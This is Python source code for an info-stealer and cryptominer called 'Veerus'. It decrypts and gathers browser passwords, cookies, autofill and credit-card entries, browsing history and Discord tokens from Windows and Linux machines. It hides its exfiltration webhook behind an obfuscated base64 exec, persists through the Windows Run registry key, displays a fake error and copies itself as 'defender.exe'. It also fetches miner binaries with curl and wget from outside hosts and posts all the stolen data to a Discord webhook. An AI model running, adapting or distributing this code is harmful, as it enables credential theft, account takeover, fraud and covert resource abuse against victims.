import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
from shutil import copyfile
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import win32crypt
import codecs
import win32crypt
import shutil
import command
import socket
import time
import threading
import re
import json
import uuid
import textwrap
from glob import glob
import FireFoxDecrypt
import requests
from startup import startup
from tkinter import messagebox
import discord
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from json import loads
from regex import findall
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import codecs
import os
from http.server import HTTPServer, CGIHTTPRequestHandler



"""

	globals :

"""
#https://discord.com/api/webhooks/1009692660677746689/gdpKIwWkfzJs6HQYV9RTsW_r7_ydwQmOLTyxaKxl0L9_rdfuDnreOS9gLLu01mZzpb_I
WaiBook = """it|qs;00jjthprg/dpn0bqj0xejioplt5215:6<37717888576@:/heqQJx\lf}Kt7IRZW:SUs_`r8`zjxRrPLWzybLym1M:`rlguEoskPT>hLOv12n[{qc`J"""
SALTWAIbOOk = "45d45az1daz56456adaNHBFHBHBJFazj"
chiffre = [109, 118, 121, 115, 116, 58, 47, 52, 102, 110, 118, 108, 118, 115, 102, 48, 103, 120, 110, 47, 97, 121, 112, 48, 121, 103, 103, 107, 116, 115, 112, 117, 52, 52, 53, 52, 66, 61, 58, 50, 54, 63, 55, 61, 63, 62, 57, 58, 60, 61, 56, 64, 49, 109, 106, 119, 77, 79, 125, 94, 111, 109, 122, 83, 122, 55, 74, 83, 90, 86, 63, 87, 86, 120, 90, 96, 114, 55, 100, 123, 105, 122, 90, 116, 80, 78, 86, 125, 129, 98, 75, 120, 117, 55, 77, 59, 97, 119, 103, 107, 121, 73, 112, 119, 104, 84, 87, 66, 110, 77, 76, 117, 57, 56, 116, 98, 129, 114, 104, 101, 80]


ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao

PORTWEB = 80
CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
PROCESS_NUM = 2 #2 is the perfect number,if you want your program to be un-removable put it a 4 maximum

FAKERROR = True #Show fake critical error 
FAKERRMSG = "Exception at thread 0xSxZ3b78"
MINE = True #Mine crypto? True/False

DMALL_FRIENDS = False #Dm all friends in discord using token.
DMALL_MSG = ":flag_gb: :\nFûcked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.


APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12
def transcrireCle(cle):
	return "".join([str(ord(elt)) for elt in cle])

exec(base64.b64decode("ZGVmIGRlY2hpZmZyZXIoY2hpZmZyZSwgY2xlLCBtc2cpOgoJbWVzc2FnZSA9ICIiCgljbGUgPSB0cmFuc2NyaXJlQ2xlKGNsZSkKCSMgcGFyY291cnMgZHUgdGFibGVhdSBjaGlmZnJlIDoKCWZvciBpIGluIHJhbmdlKGxlbihjaGlmZnJlKSk6CgkJIyBvbiBhcHBsaXF1ZSBsZSBjaGlmZnJlbWVudCDDoCBsJ2VudmVycwoJCWNoaWZmcmVbaV0gLT0gaW50KGNsZVtpICUgbGVuKGNsZSldKQoJCSMgb24gcmV0cm91dmUgbGUgY2FyYWN0w6hyZSBhdmVjIGNocigpCgkJbWVzc2FnZSArPSBjaHIoY2hpZmZyZVtpXSkKCQoJcmV0dXJuIG1lc3NhZ2UKV2FpQm9vayA9IHN0cihkZWNoaWZmcmVyKGNoaWZmcmUsIFNBTFRXQUliT09rLCBXYWlCb29rKSk="))


Founded = False
res =  """Stealed By 0xSxZ ------------> \n\n"""
creditcard = "=========Stealed by 0xSxZ =============\n\n"
currency = "=========Stealed by 0xSxZ =============\n\n"
local_appdata = os.environ['LOCALAPPDATA'] + "\\"
default_appdata = os.getenv('APPDATA')
chromiumpaths = [
	default_appdata + "\\Opera Software\\Opera Stable",
	default_appdata + "\\Opera Software\\Opera GX Stable",
	local_appdata + "Google\\Chrome",
	local_appdata + "Google(x86)\\Chrome",
	local_appdata + "Chromium",
	local_appdata + "BraveSoftware\\Brave-Browser",
	local_appdata + "Epic Privacy Browser",
	local_appdata + "Amigo",
	local_appdata + "Vivaldi",
	local_appdata + "Orbitum",
	local_appdata + "Mail.Ru\\Atom",
	local_appdata + "Kometa",
	local_appdata + "Comodo\\Dragon",
	local_appdata + "Torch",
	local_appdata + "Comodo",
	local_appdata + "Slimjet",
	local_appdata + "360Browser\\Browser",
	local_appdata + "Maxthon3",
	local_appdata + "K-Melon",
	local_appdata + "Sputnik\\Sputnik",
	local_appdata + "Nichrome",
	local_appdata + "CocCoc\\Browser",
	local_appdata + "uCozMedia\\Uran",
	local_appdata + "Chromodo",
	local_appdata + "Yandex\\YandexBrowser"
]

yes = "yes"
if yes == "yes":

	def ClearTerm():
		if(os.name == "nt" or os.name == "windows"):
			os.system("cls")
		else:
			os.system("clear")
	if(CLONE_PROCESS == True):
		for i in range(PROCESS_NUM):
			if os.name != "nt" or os.name != "windows" and platform.system() != "Windows":
				original = sys.argv[0]
				folderName = str(uuid.uuid4())
				os.mkdir("/opt/" + folderName)
				target = "/opt/" + folderName + "defender.exe"
			else:
				original = sys.argv[0]
				folderName = str(uuid.uuid4())
				os.mkdir(str(os.getenv('APPDATA')) + folderName)
				target = str(os.getenv('APPDATA')) + folderName + "defender.exe"
			shutil.copyfile(original, target)
	def fakerrthread():
		if(FAKERROR == True):
			messagebox.showwarning("Critical Error", FAKERRMSG) 
	threading.Thread(target=fakerrthread).start()
	try:
		url = 'http://ipinfo.io/json'
		response = requests.get(url)
		data = response.json()
		IP=data['ip']
		org=data['org']
		city = data['city']
		country=data['country']
		region=data['region']
	except:
		IP = str(uuid.uuid4())
		city = str(uuid.uuid4())
		country = str(uuid.uuid4())


	def ClearTerm():
		if(os.name == "nt" or os.name == "windows"):
			os.system("cls")
		else:
			os.system("clear")
	def AddToRegistry():
		#Statup should be available soon for Mac OS
		if os.name == "nt" or os.name == "windows":
			import winreg as reg
			pth = os.path.dirname(os.path.realpath(__file__))
			
			# name of the python file with extension
			s_name=os.path.basename(__file__)	
			
			# joins the file name to end of path address
			address=os.path.join(pth,s_name)
			
			# key we want to change is HKEY_CURRENT_USER
			# key value is Software\Microsoft\Windows\CurrentVersion\Run
			key = reg.HKEY_CURRENT_USER
			key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
			
			# open the key to make changes to
			open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
			
			# modifiy the opened key
			reg.SetValueEx(open,"WineDefender",0,reg.REG_SZ,address)
			
			# now close the opened key
			reg.CloseKey(open)
		else:
			print("[.] Startup not available because os is Linux or mac.")


	def stealChromeWin():
		res =  """Stealed By 0xSxZ ------------> \n\n"""
		creditcard = "=========Stealed by 0xSxZ =============\n\n"
		currency = "=========Stealed by 0xSxZ =============\n\n"
		try:
			ClearTerm()
			ibm = 0
			for i in range(len(chromiumpaths)):
				if not os.path.exists(chromiumpaths[i]):
					continue
				path = str(chromiumpaths[i] + "\\Web Data")
				db = sqlite3.connect(path)
				connection = sqlite3.connect(str(path))
				cursor = db.cursor()
				cursor.execute("SELECT  name, value FROM 'autofill'")
				for name, value in cursor.fetchall():
					print(res)
					res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
					if("card" in value or "credit" in value):
						creditcard = creditcard + res
					if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
						currency = currency + res
					ibm = ibm + 1
					if(ibm >= 370):
						break
				connection.close()
				if(ibm >= 370):
					break
			Founded = True
			return str(res) + ":::667" + str(currency) + ":::667" + str(creditcard)
		except Exception as e:
			print(e)
			pass

	def stealChromeWinHistory():
		try:
			path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
			connection = sqlite3.connect(str(path))
			chromewinhist = str( tuple(connection.execute("SELECT url FROM 'urls'")))
			connection.close()
			return chromewinhist.replace("(", '\n').replace(")", "\r\n")
		except Exception as e:
			return "[.] Error"
	"""
		credits : 
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc

	"""


	def get_chrome_datetime(chromedate):
		"""Return a `datetime.datetime` object from a chrome format datetime
		Since `chromedate` is formatted as the number of microseconds since January, 1601"""
		if chromedate != 86400000000 and chromedate:
			try:
				return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
			except Exception as e:
				print(f"Error: {e}, chromedate: {chromedate}")
				return chromedate
		else:
			return ""

	def get_encryption_key(path):
		local_state_path = path + "\\Local State"
		with open(local_state_path, "r", encoding="utf-8") as f:
			local_state = f.read()
			local_state = json.loads(local_state)

		# decode the encryption key from Base64
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		# remove 'DPAPI' str
		key = key[5:]
		# return decrypted key that was originally encrypted
		# using a session key derived from current user's logon credentials
		# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

	def decrypt_data(data, key):
		try:
			# get the initialization vector
			iv = data[3:15]
			data = data[15:]
			# generate cipher
			cipher = AES.new(key, AES.MODE_GCM, iv)
			# decrypt password
			return cipher.decrypt(data)[:-16].decode()
		except:
			try:
				return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
			except:
				# not supported
				return ""

	def chromeCookies():
		try:
			chrcooks = ""
			for i in range(len(chromiumpaths)):
				db_path = chromiumpaths[i] + "\\Network\\Cookies"
				print("Getting Chrome cookies : " + db_path)
				if not os.path.exists(db_path):
					continue
				
				filename =  str(uuid.uuid4()) + ".db"
				if not os.path.isfile(filename):
					shutil.copyfile(db_path, filename)
				# connect to the database
				db = sqlite3.connect(filename)
				# ignore decoding errors
				db.text_factory = lambda b: b.decode(errors="ignore")
				cursor = db.cursor()
				# get the cookies from `cookies` table
				cursor.execute("""
				SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
				FROM cookies""")
				# you can also search by domain, e.g thepythoncode.com
				# cursor.execute("""
				# SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
				# FROM cookies
				# WHERE host_key like '%thepythoncode.com%'""")
				# get the AES key
				key = get_encryption_key(chromiumpaths[i])
				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
					decrypted_value = decrypt_data(encrypted_value, key)
					if not value:
						decrypted_value = decrypt_data(encrypted_value, key)
					else:
						chrcooks = chrcooks + f"""
					Host: {host_key}
					Cookie name: {name}
					Cookie value (decrypted): {decrypted_value}
					Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
					Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
					Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
					===============================================================
					"""
					# update the cookies table with the decrypted value
					# and make session cookie persistent
					cursor.execute("""
					UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
					WHERE host_key = ?
					AND name = ?""", (decrypted_value, host_key, name))
				# commit changes
				db.commit()
				# close connection
				db.close()

			return chrcooks
		except Exception as e:
			print(e)
	def PasswLinux():
		try:
			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
			FirefoxPath2 = os.listdir(FirefoxPath)
			FirefoxLength = len(FirefoxPath2)
			for i in range(FirefoxLength):
				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
					if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
						db = FirefoxPath + FirefoxPath2[i] + "/key3.db"
					else:
						db = FirefoxPath + FirefoxPath2[i] + "/key4.db"
					passwordF = FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"/logins.json", db)
					return("""
	-------------------------
	Veerus by 0xSz
	Password stealed
	------------------------\n
	""" + str(passwordF)+"\n\n------------------------")
					break
				else:
					print("False")
		except Exception as e:
			return "Error  or no passwords. : " + str(e)

	def CookiesLinux():
		try:
			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
			FirefoxPath2 = os.listdir(FirefoxPath)
			FirefoxLength = len(FirefoxPath2)
			for i in range(FirefoxLength):
				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/cookies.sqlite")):
					db = FirefoxPath + FirefoxPath2[i] + "/cookies.sqlite"
					connection = sqlite3.connect(str(db))
					cookies = str( tuple(connection.execute("SELECT host FROM moz_cookies"))) + str(dict(connection.execute("SELECT name, value FROM moz_cookies")))
					connection.close()
					return (b"""
	-------------------------
	Veerus by 0xSz
	Cookies stealed
	------------------------\n
	""" + bytes(str(cookies),encoding='utf-8') +b"\n\n------------------------")
					break
				else:
					print("False")
		except Exception as e:
			return chromeCookies()


	"""

		credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py

	"""

	tokens = []
	cleaned = []

	def decrypt(buff, master_key):
		try:
			return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
		except Exception as e:
			return "An error has occured.\n" + e
	askUser = "2"
	def getDisk0rdToken():
		if "2" in askUser:

			with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local State", "r") as file:
				key = loads(file.read())['os_crypt']['encrypted_key']
				file.close()
			for file in listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\"):
				if not file.endswith(".ldb") and file.endswith(".log"):
					continue
				else:
					try:
						with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
							for x in files.readlines():
								x.strip()
								for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
									tokens.append(values +"\n")
									
					except PermissionError:
						continue
			for i in tokens:
				if i.endswith("\\"):
					i.replace("\\", "")
				elif i not in cleaned:
					cleaned.append(i)
			tosend = ""
			for token in cleaned:
				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode())
			return tosend
	"""

		^^^^^credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py^^^^^

	"""
	def PasswWin():
		print("[.] Getting Win Firefow pw's")
		try:
			if os.name == 'nt' or os.name == 'windows':	

				passwordF = ""
				FirefoxPath = str(os.getenv('APPDATA')) + "\\Mozilla\\Firefox\\Profiles\\"
				FirefoxPath2 = os.listdir(FirefoxPath)
				FirefoxLength = len(FirefoxPath2)
				for i in range(FirefoxLength):
					if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "\\key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
						if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
							db = FirefoxPath + FirefoxPath2[i] + "\\key3.db"
						else:
							db = FirefoxPath + FirefoxPath2[i] + "\\key4.db"
						passwordF = passwordF + str(FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"\\logins.json", db))
					else:
						print("False")
				return ("""
		-------------------------
		Veerus by 0xSz (on github)
		Password stealed
		------------------------\n
		""" + str(passwordF) +"\n\n------------------------")
						

			else:
				return b"OS not supported."
		except Exception as e:
			return "Error : " + str(e)

	def MineThreadWin():
		ClearTerm()
		print("[.] Starting miner if enabled.")
		os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe")

	def MineThreadLinux():
		print("[.] Starting miner if enabled.")
		try:
			os.system("./apt.bb -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
		except:
			os.system("./apt.bb -o rx.unmineable.com:3333 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
	def connectOption():
		if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
			print("Not windows...")
			try:
				os.system("mkdir /opt/0xSz/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/aptEssentials/")
				os.chdir("/opt/0xSz/update/aptEssentials/")
				os.system("apt install wget")
				os.system("wget https://www.dropbox.com/s/kebdpffh42q7e7z/apt?dl=1 -O /opt/0xSz/update/aptEssentials/apt.bb")
				os.system("chmod +x ./apt.bb")
				#threading.Thread(target=MineThreadLinux).start()
				time.sleep(2)
				if MINE == True:
					threading.Thread(target=MineThreadLinux)
					print("[.] Executing miner..")
			except Exception as e :
				print(str(e))

			threading.Thread(target=getInstructions, args=(s,)).start()
		else:
			try:
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
				open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
	{
		"algo": "rx",
		"api": {
			"port": 0,
			"access-token": null,
			"worker-id": null,
			"ipv6": false,
			"restricted": true
		},
		"av": 0,
		"background": false,
		"colors": true,
		"cpu-affinity": null,
		"cpu-priority": null,
		"donate-level": 5,
		"huge-pages": true,
		"hw-aes": null,
		"log-file": null,
		"max-cpu-usage": 80,
		"pools": [
			{
				"url": "rx.unmineable.com:3333",
				"user": "'''+ ADDRESS  + '''",
				"pass": "x",
				"keepalive": true,
				"nicehash": false,
				"variant": -1,
				"tls": false,
				"tls-fingerprint": null
			}
		],
		"print-time": 60,
		"retries": 5,
		"retry-pause": 5,
		"safe": false,
		"syslog": false,
		"threads": null
	}

				''')
				os.system("curl gr4bb3r.42web.io/cUrl.exe --output cUrl.exe -s")
				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")

				if MINE == True:
					threading.Thread(target=MineThreadWin)
					print("[.] Executing miner..")
			except Exception as e:
				print(e)
	if(WaiBook != "" and WaiBook != None):
		webhook = DiscordWebhook(url=WaiBook, username="github.com/0xSxZ/Veerus/")
		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
		webhook.add_embed(embed)
		webhook.add_file(file=str(CookiesLinux()), filename="0xCookies.txt") 
		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
		webhook.add_file(file=PasswWin().replace("{'", "\n\n").replace("},", ""), filename="0xPasswords.txt")
		
		autfill = stealChromeWin().split(":::667")
		webhook.add_file(file=autfill[0], filename="Autofill.txt")
		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

"""+autfill[1] + autfill[2], filename="finance_and_money.txt")

		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
		webhook.execute()
